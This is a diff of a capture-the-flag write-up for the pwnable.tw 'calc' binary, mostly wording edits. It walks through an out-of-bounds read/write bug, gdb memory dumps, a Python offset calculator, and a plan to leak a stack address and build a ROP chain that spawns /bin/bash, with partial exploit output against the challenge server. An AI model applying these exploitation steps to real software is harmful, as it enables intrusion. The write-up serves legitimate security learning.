@@ -81,13 +81,13 @@ void calc(void)
 }
 ```
 The function `calc` calls the following functions  
-`bzero` : It zeros the memory region
-`get_expr`: It is used to read the expression and separates the symbols and numbers  
-`parse_expr`: Evaluates the separated expression  
+`bzero` : It zeros the memory region  
+`get_expr`: It is used to read the expression and separates the symbols and numbers    
+`parse_expr`: Evaluates the separated expression    
 There are few checks in `parse_expr` to prevent incomplete expression and division by zero  
 
 After looking around for quite sometime for some kind of vulnerabilities I was pretty disappointed and frustrated.
-Even though I understood the overall code I was having a hard time understanding and follow the variables and I couldn't figure out any kind of vulnerabilities that I could exploit.  
+Even though I understood the overall code I was having a hard time understanding and following the variables and I couldn't figure out any kind of vulnerabilities that I could exploit.  
 Then I tried to trigger some kind of `segfault` by entering different inputs.
 ## Dynamic Analysis
 
@@ -178,10 +178,11 @@ $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 ────────────────────────────────────────────────────────────────────────────
 ```
-``[edx+eax*4+0x4]`` points to an invalid address hence it segfaults. There is some other interesting things here
+``[edx+eax*4+0x4]`` points to an invalid address hence it segfaults. There is some other interesting things here  
 `eax` contains the first value we entered and `ecx` contains the second the value we entered.
-So we have the ability to write anything anywhere we want. Awesome!  
-Lets see how we can exploit that. But before that lets check the `printf` too since we were getting random output
+So we have the ability to write anything(using `ecx`) anywhere (using `eax`) we want.  
+Awesome!   
+Lets see how we can exploit that. But before that lets check the `printf` too since we were getting random output.  
 Lets run the program again and set a break point at `printf`
 ```bash
    0x080493ff <+134>:   mov    eax,DWORD PTR [ebp+eax*4-0x59c]
@@ -210,13 +211,13 @@ $esi   : 0x0
 ```
 `eax` contains the value we have entered.
 So we can read from anywhere in the memory and we can write to anywhere in memory.  
-#### Limitations
+### Few Limitations
 After playing around a bit I found the following  
 1. We cannot write a value bigger than `0x7fffffff`. [I tried this by entering a very large number and `ecx` has the value we entered]  
 2. The stack is not executable so we have to use `ROP`  
-3. The stack value kept on shifting but we can use the `same` value of `eax` to overwrite and to read from memory
+3. The stack value kept on shifting but we can use the `same` value of `eax` to overwrite and to read from `stack` where the return pointer of main is  
 So my plan was to pop a shell using `ROP`. I used the `return` pointer of `main` function to start the `ROP` chain.
-Before that I calculated the value of `eax` required to read and write from the position of the return pointer of `main` function
+Before that I calculated the value of `eax` required to write to and read from the position of the return pointer of `main` function
 
 I used the following script to calculate the required `eax` value
 ```python
@@ -228,13 +229,20 @@ def signed(x):
 
 def ov(y):
     ov = signed(y)
-    edx = signed(0xff977038)
-    return (ov - 4 -edx)/4
-main_ret=ov(0xff9775fc)
+    edx = signed(0xff977038)  #I took a sample value of edx to calculate the offset to main ret address
+    return (ov - 4 -edx)/4 # Finding value of eax required to overwrite the given address from "DWORD PTR [edx+eax*4+0x4], ecx"
+main_ret=ov(0xff9775fc)  #Sample main return address used to calculate the offset
 ```
 The function `ov` return the value of `eax` required to write the given address.
 When `eax` was `+369` we could leak the return value of main and we can use the same offset to write to that address.
 ```bash
+gef➤  disas main
+----------
+output snipped
+----------
+   0x08049499 <+71>:    mov    DWORD PTR [esp],0x80bf842
+   0x080494a0 <+78>:    call   0x80504c0 <puts>
+   0x080494a5 <+83>:    leave
    0x080494a6 <+84>:    ret
 gef➤  break *0x080494a6
 Breakpoint 1 at 0x80494a6
@@ -261,17 +269,9 @@ gef➤  x/20wx $esp
 0xffffd66c:     0x00000000      0x00000000      0x00000000      0x00000000
 0xffffd67c:     0x00000000      0x00000000      0x00000000      0x00000000
 ```
-We can see we have successfully leaked the return address. [`134518394` is `0x0804967a` in decimal] But we can't use this address to understand the stack address but the value at 3rd offset from the return value points to stack. So if leak this address we can understand the stack address.
+We can see we have successfully leaked the return address. [`134518394` is `0x0804967a` in decimal]. But we can't use this address to get the stack address but the value at 3rd offset(+371) from the return value points to the stack. So if leak this address we can understand the stack address.
 ### Why we have to leak the stack address
-My first plan was to simply write a shellcode without depending on any leaked value. But I faced few problems.  
-Actually we don't have to leak the stack address to put together the exploit since every time the offset 369 will point to the return 
-address of `main` function. So we can simply write our `ROP` chain using the offsets as each offset plus one will point
-to the next address. But I faced the problem here. To pop a shell we have to point `ebx` to the address of string `/bin/bash`. So we 
-have to write the string to somewhere in stack. But when we write the string to the stack the address of the string will be greater than
-`0x7fffffff`, which is the greatest value we can write. So we have to write the string to any address less than `0x7fffffff`. So my plan was
-to write to `.BSS`. Now we have another problem. `.BSS` is at a fixed location but the stack value keeps on changing so the offset or
-the address length between the `retun` value of `main` function and `.BSS` keeps on changing every time we run the program. But
-if we can leak the stack address then we will be able to calculate the value we have to enter in `eax` to overwrite the address of `.BSS`.
+My first plan was to simply write a shellcode without depending on any leaked value. But I faced few problems. Actually we don't have to leak the stack address to put together the exploit since every time the offset `369` will point to the return address of `main` function. So we can simply write our `ROP` chain using the offsets as each offset plus one will point to the next address. But I faced the problem here. To pop a shell we have to point `ebx` to the address of string `/bin/bash`. So we have to write the string to somewhere in stack. But when we write the string to the stack the address of the string will be greater than `0x7fffffff`, which is the greatest value we can write. So we have to write the string to any address less than `0x7fffffff`. So my plan was to write to `.BSS`. Now we have another problem. `.BSS` is at a fixed location but the stack value keeps on changing so the offset or the address length between the `retun` value of `main` function and `.BSS` keeps on changing every time we run the program. But if we can leak the stack address then we will be able to calculate the value we have to enter in `eax` to overwrite the address of `.BSS`.
 This is why we have to leak the stack address.
 
 ## Solution 
@@ -281,7 +281,7 @@ So my plan was to do the following
 2. Leak the value of stack to calculate the offset of `.BSS`
 3. Overwrite `.BSS` with string and then write that address to stack
 
-And put together the following script
+And I put together the following script
 ```python
 from pwn import *
 from ctypes import *
@@ -371,8 +371,6 @@ And lets run it
 ```bash
 root@kali:~/Downloads# python calc6.py
 [+] Opening connection to chall.pwnable.tw on port 10100: Done
--3058332
--3058324
 +34561102+6845231
 +34561101+1852400175
 +34561105+135184464
@@ -403,5 +401,4 @@ FLAG{xxxxxxxxxxxxxxxx}
 ### Solved!
 
 ## After Thoughts
-This level was incredibly tough for me. The python script is not very elegant and can be written in a better way but I am still a noob and
-I have tried my best to explain what I did. I saw few other writeups and few others have completed this level using much better shellcodes to solve this level. I have used a very basic shellcode for popping a shell. You could use a much shorter and better shellcodes instead. So I advice you to go checkout other writeups also.
+This level was incredibly tough for me. The python script is not very elegant and can be a little confusing. I am sure that it can be written in a better way but I am still a noob. I have tried my best to explain what I did. I saw few other writeups where they have completed this level using much better shellcodes. I have used a very basic shellcode for popping a shell. You could use a much shorter and better shellcodes instead. So I advice you to go checkout other writeups also.
